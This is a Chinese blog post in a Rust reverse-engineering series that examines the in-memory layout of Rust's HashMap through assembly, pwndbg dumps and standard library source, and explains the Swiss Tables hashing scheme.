    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/28/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/28/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-7/" class="post-title-link" itemprop="url">Rust逆向学习 (7)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-28 20:59:52" itemprop="dateCreated datePublished" datetime="2023-11-28T20:59:52+08:00">2023-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-12-13 23:50:53" itemprop="dateModified" datetime="2023-12-13T23:50:53+08:00">2023-12-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-hashmap"><a class="markdownIt-Anchor" href="#reverse-for-hashmap"></a> Reverse for HashMap</h1>
<p>HashMap是各个语言常用的一种数据结构，在每个语言中的实现都有或多或少的差别，相信学过数据结构的都知道HashMap在数据量较大时具有很小的时间复杂度。下面我们将分析在Rust中，HashMap在内存中的表示方式。</p>
<h2 id="new-insert-get"><a class="markdownIt-Anchor" href="#new-insert-get"></a> <code>new</code> / <code>insert</code> / <code>get</code></h2>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span>: HashMap&lt;<span class="type">u64</span>, <span class="type">u64</span>&gt; = HashMap::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    map.<span class="title function_ invoke__">insert</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, map.<span class="title function_ invoke__">get</span>(&amp;<span class="number">1u64</span>).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上面的代码为例。我们分段看一下对应的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">    sub     rsp, 200</span><br><span class="line">    mov     rax, qword ptr [rip + std::collections::hash::map::HashMap&lt;K,V&gt;::new@GOTPCREL]</span><br><span class="line">    lea     rdi, [rsp + 48]</span><br><span class="line">    mov     qword ptr [rsp + 40], rdi</span><br><span class="line">    call    rax</span><br><span class="line">    mov     rdi, qword ptr [rsp + 40]</span><br><span class="line">    mov     rax, qword ptr [rip + std::collections::hash::map::HashMap&lt;K,V,S&gt;::insert@GOTPCREL]</span><br><span class="line">    mov     esi, 1</span><br><span class="line">    mov     edx, 2</span><br><span class="line">    call    rax</span><br><span class="line">    jmp     .LBB157_3</span><br></pre></td></tr></table></figure>
<p>上面的代码包含了<code>new</code>和<code>insert</code>两个操作，通过调试发现，<code>new</code>方法与字符串、可变数组的<code>new</code>类似，都是传入要初始化的栈指针。在初始化完成之后，这部分栈的数据如下所示，貌似看不出来什么特殊的地方。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fffffffd910</span><br><span class="line">00:0000│ rax rdi 0x7fffffffd910 —▸ 0x5555555a62d0 ◂— 0xffffffffffffffff</span><br><span class="line">01:0008│         0x7fffffffd918 ◂— 0x0</span><br><span class="line">... ↓            2 skipped</span><br><span class="line">04:0020│         0x7fffffffd930 ◂— 0x419fa2b4be855595</span><br><span class="line">05:0028│         0x7fffffffd938 ◂— 0x944210c733652a9b</span><br></pre></td></tr></table></figure>
<p>往下是插入方法的调用，参数类型也很明显，第一个为HashMap栈指针，第二个是Key，第三个是Value。我们要重点看一下调用后HashMap的内存结构长啥样。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fffffffd910</span><br><span class="line">00:0000│  0x7fffffffd910 —▸ 0x5555555bebe0 ◂— 0xffffffffff45ffff</span><br><span class="line">01:0008│  0x7fffffffd918 ◂— 0x3</span><br><span class="line">02:0010│  0x7fffffffd920 ◂— 0x2</span><br><span class="line">03:0018│  0x7fffffffd928 ◂— 0x1</span><br><span class="line">04:0020│  0x7fffffffd930 ◂— 0x419fa2b4be855595</span><br><span class="line">05:0028│  0x7fffffffd938 ◂— 0x944210c733652a9b</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x5555555beb90</span><br><span class="line">00:0000│     0x5555555beb90 ◂— 0x0</span><br><span class="line">01:0008│     0x5555555beb98 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">02:0010│ r9  0x5555555beba0 ◂— 0x0</span><br><span class="line">03:0018│     0x5555555beba8 ◂— 0x0</span><br><span class="line">04:0020│ rcx 0x5555555bebb0 ◂— 0x1</span><br><span class="line">05:0028│     0x5555555bebb8 ◂— 0x2</span><br><span class="line">06:0030│     0x5555555bebc0 ◂— 0x0</span><br><span class="line">07:0038│     0x5555555bebc8 ◂— 0x0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│     0x5555555bebd0 ◂— 0x0</span><br><span class="line">09:0048│     0x5555555bebd8 ◂— 0x0</span><br><span class="line">0a:0050│ rdi 0x5555555bebe0 ◂— 0xffffffffff45ffff</span><br><span class="line">0b:0058│     0x5555555bebe8 ◂— 0xffffffffffffffff</span><br><span class="line">0c:0060│     0x5555555bebf0 ◂— 0xff45ffff</span><br><span class="line">0d:0068│     0x5555555bebf8 ◂— 0x20411</span><br><span class="line">0e:0070│     0x5555555bec00 ◂— 0x0</span><br><span class="line">0f:0078│     0x5555555bec08 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>可以看到，0x5555555beb90应该就是与HashMap相关的数据结构，下面的0x20411是top chunk的大小，后面的内容不属于这个chunk。值得注意的是，这个chunk中确实保存了我们插入的数据，后面还有一些由0xFF组成的未知数据结构。这样看来，单插入一个数据看不出来它的具体实现方式，因此这里尝试多插入一些结构，看看内存的变化。</p>
<p>不看不知道，一看发现，其中的玄机还挺大。在HashMap的栈对象内存空间中，我们在最后可以看到有一个被像是随机数一类的数据占用的0x10大小的内存空间，从IDA反编译可以得知，这是<code>std::collection::hash_map::RandomState</code>实例。这又是一个什么东西呢？</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    k0: <span class="type">u64</span>,</span><br><span class="line">    k1: <span class="type">u64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="meta">#[allow(deprecated)]</span></span><br><span class="line">    <span class="meta">#[must_use]</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;hashmap_build_hasher&quot;</span>, since = <span class="string">&quot;1.7.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> RandomState &#123;</span><br><span class="line">        thread_local!(<span class="keyword">static</span> KEYS: Cell&lt;(<span class="type">u64</span>, <span class="type">u64</span>)&gt; = &#123;</span><br><span class="line">            Cell::<span class="title function_ invoke__">new</span>(sys::<span class="title function_ invoke__">hashmap_random_keys</span>())</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        KEYS.<span class="title function_ invoke__">with</span>(|keys| &#123;</span><br><span class="line">            <span class="keyword">let</span> (k0, k1) = keys.<span class="title function_ invoke__">get</span>();</span><br><span class="line">            keys.<span class="title function_ invoke__">set</span>((k0.<span class="title function_ invoke__">wrapping_add</span>(<span class="number">1</span>), k1));</span><br><span class="line">            RandomState &#123; k0, k1 &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面的Rust内核部分源码可以看到，这里保存的确实是两个随机数，经过测试发现，两个随机数的值每一次执行都不一样。</p>
<p>那么，HashMap为什么需要这样一个结构呢？继续往下看源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">BuildHasher</span> &#123;</span><br><span class="line">    <span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Hasher</span>: Hasher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">build_hasher</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Hasher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;build_hasher_simple_hash_one&quot;</span>, since = <span class="string">&quot;1.71.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">hash_one</span>&lt;T: Hash&gt;(&amp;<span class="keyword">self</span>, x: T) <span class="punctuation">-&gt;</span> <span class="type">u64</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        <span class="keyword">Self</span>: <span class="built_in">Sized</span>,</span><br><span class="line">        <span class="keyword">Self</span>::Hasher: Hasher,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">build_hasher</span>();</span><br><span class="line">        x.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        hasher.<span class="title function_ invoke__">finish</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[stable(feature = <span class="string">&quot;hashmap_build_hasher&quot;</span>, since = <span class="string">&quot;1.7.0&quot;</span>)]</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">BuildHasher</span> <span class="keyword">for</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Hasher</span> = DefaultHasher;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="meta">#[allow(deprecated)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">build_hasher</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> DefaultHasher &#123;</span><br><span class="line">        <span class="title function_ invoke__">DefaultHasher</span>(SipHasher13::<span class="title function_ invoke__">new_with_keys</span>(<span class="keyword">self</span>.k0, <span class="keyword">self</span>.k1))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从<code>RandomState</code>对<code>BuildHasher</code>这个Trait进行impl的情况来看，<code>HashMap</code>使用的是<code>SipHasher13</code>这种Hash算法。这种算法多用于短消息的哈希，是一个伪随机函数族，可作为消息认证的MAC函数使用，具有安全、快速、简洁等特点。具体的算法参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43936250/article/details/123736554">传送门</a>。HashMap在每一次<code>insert</code>与<code>get</code>的时候都会使用这个Hash函数进行计算。</p>
<p>好，现在我们知道HashMap使用什么哈希函数进行计算了，并且通过上面的分析也能够得出下面的结论：<strong>在一个Rust进程中，即使是泛型类型完全相同的两个HashMap结构，对于同一个Key所计算出的Hash值也几乎是不可能相同的，因为所使用的SipHasher算法的两个key值是随机生成的，对于不同的key值，计算出来的Hash值也不同。</strong></p>
<p>分析出使用的Hash函数后，我们可以开始解决其他的问题了。第一：这些Hash值在什么地方保存？第二：之前在堆中看到的大部分是0xFF的那一堆数据到底有什么用？</p>
<p>首先解决第一个问题。在调试中通过检查内存情况发现，这些Hash值没有保存在栈或堆中。没有保存在栈好理解，毕竟一个HashMap可能有很多个Hash值，全保存在栈里很可能爆栈的。但是堆空间也没有找到就很有意思了。从IDA反汇编的结果来看，在<code>insert</code>和<code>get</code>内部还调用了其他的方法。在<code>insert</code>中：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">insert</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, k: K, v: V) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hash</span> = make_hash::&lt;K, S&gt;(&amp;<span class="keyword">self</span>.hash_builder, &amp;k);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hasher</span> = make_hasher::&lt;_, V, S&gt;(&amp;<span class="keyword">self</span>.hash_builder);</span><br><span class="line">    <span class="keyword">match</span> <span class="keyword">self</span></span><br><span class="line">        .table</span><br><span class="line">        .<span class="title function_ invoke__">find_or_find_insert_slot</span>(hash, <span class="title function_ invoke__">equivalent_key</span>(&amp;k), hasher)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(bucket) =&gt; <span class="title function_ invoke__">Some</span>(mem::<span class="title function_ invoke__">replace</span>(<span class="keyword">unsafe</span> &#123; &amp;<span class="keyword">mut</span> bucket.<span class="title function_ invoke__">as_mut</span>().<span class="number">1</span> &#125;, v)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(slot) =&gt; &#123;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>.table.<span class="title function_ invoke__">insert_in_slot</span>(hash, slot, (k, v));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里使用hash值（不可变变量<code>hash</code>）的关键方法有<code>find_or_find_insert_slot</code>和<code>insert_in_slot</code>这两个。整个<code>insert</code>方法的逻辑和Rust中对于HashMap的插入操作逻辑相同——当Key存在时，使用新的Value替换旧的Value；当Key不存在时，将Key插入并添加Value。在上面的<code>insert</code>内核方法中，k即为新的Key，v即为新的Value。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">find_or_find_insert_slot</span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    hash: <span class="type">u64</span>,</span><br><span class="line">    <span class="keyword">mut</span> eq: <span class="keyword">impl</span> <span class="title class_">FnMut</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">bool</span>,</span><br><span class="line">    hasher: <span class="keyword">impl</span> <span class="title class_">Fn</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Bucket&lt;T&gt;, InsertSlot&gt; &#123;</span><br><span class="line">    <span class="keyword">self</span>.<span class="title function_ invoke__">reserve</span>(<span class="number">1</span>, hasher);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span></span><br><span class="line">            .table</span><br><span class="line">            .<span class="title function_ invoke__">find_or_find_insert_slot_inner</span>(hash, &amp;<span class="keyword">mut</span> |index| <span class="title function_ invoke__">eq</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">bucket</span>(index).<span class="title function_ invoke__">as_ref</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SAFETY: See explanation above.</span></span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(index) =&gt; <span class="title function_ invoke__">Ok</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">bucket</span>(index)),</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(slot) =&gt; <span class="title function_ invoke__">Err</span>(slot),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">find_or_find_insert_slot_inner</span>(</span><br><span class="line">    &amp;<span class="keyword">self</span>,</span><br><span class="line">    hash: <span class="type">u64</span>,</span><br><span class="line">    eq: &amp;<span class="keyword">mut</span> <span class="keyword">dyn</span> <span class="title function_ invoke__">FnMut</span>(<span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">bool</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">usize</span>, InsertSlot&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">insert_slot</span> = <span class="literal">None</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">h2_hash</span> = <span class="title function_ invoke__">h2</span>(hash);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">probe_seq</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">probe_seq</span>(hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">group</span> = <span class="keyword">unsafe</span> &#123; Group::<span class="title function_ invoke__">load</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">ctrl</span>(probe_seq.pos)) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> <span class="variable">bit</span> <span class="keyword">in</span> group.<span class="title function_ invoke__">match_byte</span>(h2_hash) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">index</span> = (probe_seq.pos + bit) &amp; <span class="keyword">self</span>.bucket_mask;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(<span class="title function_ invoke__">eq</span>(index)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(insert_slot.<span class="title function_ invoke__">is_none</span>()) &#123;</span><br><span class="line">            insert_slot = <span class="keyword">self</span>.<span class="title function_ invoke__">find_insert_slot_in_group</span>(&amp;group, &amp;probe_seq);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(group.<span class="title function_ invoke__">match_empty</span>().<span class="title function_ invoke__">any_bit_set</span>()) &#123;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">fix_insert_slot</span>(insert_slot.<span class="title function_ invoke__">unwrap_unchecked</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        probe_seq.<span class="title function_ invoke__">move_next</span>(<span class="keyword">self</span>.bucket_mask);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到了吗？上面的unsafe方法<code>find_or_find_insert_slot_inner</code>中有一个<code>h2</code>方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="meta">#[allow(clippy::cast_possible_truncation)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">h2</span>(hash: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> <span class="type">u8</span> &#123;</span><br><span class="line">    <span class="comment">// Grab the top 7 bits of the hash. While the hash is normally a full 64-bit</span></span><br><span class="line">    <span class="comment">// value, some hash functions (such as FxHash) produce a usize result</span></span><br><span class="line">    <span class="comment">// instead, which means that the top 32 bits are 0 on 32-bit platforms.</span></span><br><span class="line">    <span class="comment">// So we use MIN_HASH_LEN constant to handle this.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">top7</span> = hash &gt;&gt; (MIN_HASH_LEN * <span class="number">8</span> - <span class="number">7</span>);</span><br><span class="line">    (top7 &amp; <span class="number">0x7f</span>) <span class="keyword">as</span> <span class="type">u8</span> <span class="comment">// truncation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>破案了，这里获取了hash的最高7位，经过调试证实，堆空间中一串0xFF中间掺杂的其他数据就是这些Hash值的最高7位。通过这个方法名，实际上已经可以在网上找到这个HashMap的算法了——Swiss Tables。经过简单了解后发现，它与Rust中的实现高度吻合。这是一种较新的高效HashMap算法，需要保存Key和Value本身，通过若干个16字节大小的桶进行索引。具体的算法实现可见<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/277732297">传送门</a>，下面也将进行简单介绍。</p>
<h2 id="swiss-tables"><a class="markdownIt-Anchor" href="#swiss-tables"></a> Swiss Tables</h2>
<h3 id="data-structure"><a class="markdownIt-Anchor" href="#data-structure"></a> Data Structure</h3>
<p>这个算法包含两个最为重要的数据结构，第一是若干个Group，每一个Group都是一个长度固定为16的数组，所有元素均为键值对，这里称每一个数组项为桶（Bucket）。第二是控制字节（Control Bytes）数组，对于每一个Group中的每一个元素，都有一个1字节的控制字节，因此控制字节数组的字节数量等于Group数量乘以16。</p>
<p>在这个算法中，需要对Hash进行如下操作：将Hash值截为无符号64位值（Rust中如果使用默认Hash算法，其输出就是无符号64位值，因此无需截断），随后分为最高7位与余下的57位。最高7位将被用来填充保存该元素的桶的控制字节的低7位，最高1位另有作用。余下的57位将用于确定将这个值保存在哪个Group中。在Rust中，控制字节为全1代表这个桶为空，为128代表这个桶被删除。</p>
<p>为方便说明，下面的所有图中，以绿色代表桶空，黄色代表满，红色代表已删除。</p>
<p><img src="1.png" alt="" /></p>
<h3 id="insertdeletefind"><a class="markdownIt-Anchor" href="#insertdeletefind"></a> Insert/Delete/Find</h3>
<p>那么这里就出现了一个问题：如果57位只是用来确定应该保存在哪个组，那么应该如何确定保存到组中的哪个桶呢？实际上这个问题根本不需要考虑，因为Swiss Tables充分考虑了现代CPU浮点数架构的性能优化，对于一个组，它的控制字节一共16字节，正好是一个浮点寄存器的大小，在实际实现的时候可以通过使用浮点数指令来进行加速，无论元素被保存到一个组中的哪个桶，都能够在固定的时间完成对一组的查找下面通过查找来简单说明。</p>
<p>如果需要查找某个Key，首先计算Hash值，随后获取高7位与其应该保存到的组的索引值，为方便说明，假设高7位为0x18。下面首先要完成的工作是尝试匹配高7字节，即在这个桶的16字节中尝试找到一个字节的值为0x18。找到之后还需要进一步比较Key值是否真的相等，因为7字节的空间很小容易发生碰撞。如果没有匹配到，需要判断这个组是否已经填满。因为Swiss Tables的插入规则中包含这样一条：当目标组已满时，需要判断该组的下一个组是否全满，如果不是则保存到下一个组，如果是则继续向下查找。也就是说，在查找的时候如果发现目标组已经填满且组中没有找到Key，则还需要向下查找下面的组，直到查找到Key或检测到某个组不是全满为止。</p>
<p><img src="2.png" alt="" /></p>
